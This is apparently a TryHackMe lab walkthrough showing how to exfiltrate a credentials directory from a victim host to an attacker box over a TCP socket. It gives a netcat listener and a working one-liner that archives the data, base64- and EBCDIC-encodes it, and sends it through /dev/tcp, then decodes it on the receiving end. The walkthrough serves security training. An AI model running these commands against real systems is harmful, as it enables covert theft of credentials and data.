# Exfiltration Using TCP Socket

This task demonstrates how to exfiltrate data over TCP using data encoding. Using a TCP socket is one of the data exfiltration techniques attackers may use in non-secured environments without network-based security products. In well-secured environments, this method is not recommended as it is easy to detect due to reliance on non-standard protocols.

## Overview

Besides the TCP socket, we will use additional techniques such as data encoding and archiving. A key benefit of this approach is that it encodes the data during transmission, making it harder to examine.

### How TCP Communication Works

If two machines want to communicate over TCP, one must listen for incoming traffic. This is similar to how two people communicate, where one listens while the other speaks.

#### Connection Over TCP/Port

The diagram below explains how two hosts communicate over TCP on port 1337:

1. The first machine listens on TCP port 1337.
2. The second machine connects to the specified port (e.g., `nc 1.2.3.4 1337`).
3. The first machine establishes the connection.
4. Data transfer begins (e.g., the attacker sends commands and receives results).

### Network Setup

We will use two machines for this task:
- **Victim Machine**: `victim1.thm.com`
- **Attacker Machine**: `jump.thm.com` (JumpBox)

#### Setting Up a Listener on the JumpBox

Run the following command on the JumpBox to listen on port 8080 and save the received data:

```bash
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
```

#### Connecting to the Victim Machine

Use the following credentials to connect to the victim machine: `thm:tryhackme`.

From the JumpBox:
```bash
thm@jump-box$ ssh thm@victim1.thm.com
```

From the AttackBox (using port 2022):
```bash
root@AttackBox$ ssh thm@10.10.82.84 -p 2022
```

### Preparing Data for Exfiltration

On the victim machine, check the credentials file:

```bash
thm@victim1:~$ cat task4/creds.txt
admin:password
Admin:123456
root:toor
```

### Exfiltrating Data Over TCP Socket

Ensure the listener is running on the JumpBox. Then, execute the following command on the victim machine to exfiltrate the data:

```bash
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
0+1 records in
0+1 records out
260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```

#### Command Breakdown

- `tar zcf - task4/`: Creates a compressed archive of the `task4/` directory.
    - `z`: Use gzip for compression.
    - `c`: Create a new archive.
    - `f`: Specify the archive file.
- `base64`: Converts the archive to Base64 representation.
- `dd conv=ebcdic`: Encodes the data using EBCDIC.
- `/dev/tcp/192.168.0.133/8080`: Sends the data to the specified IP and port.

### Receiving and Restoring Data on the JumpBox

#### Receiving Data

On the JumpBox, confirm the data is received:

```bash
thm@jump-box$ ls -l /tmp/
-rw-r--r-- 1 root root 240 Apr 8 11:37 task4-creds.data
```

#### Restoring the Data

Convert the received data back to its original format:

```bash
thm@jump-box$ cd /tmp/
thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar
0+1 records in
0+1 records out
260 bytes transferred in 0.000321 secs (810192 bytes/sec)
```

#### Extracting the Archive

Unarchive the file and verify its contents:

```bash
thm@jump-box$ tar xvf task4-creds.tar
task4/
task4/creds.txt
```

#### Confirming the Data

Check the extracted file:

```bash
thm@jump-box$ cat task4/creds.txt
admin:password
Admin:123456
root:toor
```

## Conclusion

We successfully exfiltrated data from the victim machine to the attacker machine using a TCP socket.